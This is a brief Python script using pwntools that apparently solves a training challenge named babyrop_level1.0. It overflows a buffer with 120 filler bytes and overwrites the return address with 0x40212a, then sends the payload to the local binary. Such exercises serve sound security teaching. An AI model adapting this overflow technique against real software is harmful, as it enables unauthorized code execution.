from pwn import *

payload = b""
payload += b"A" * 120
payload += p64(0x40212a)

p = process("/challenge/babyrop_level1.0", env={})

p.sendline(payload)

print(p.recvall())
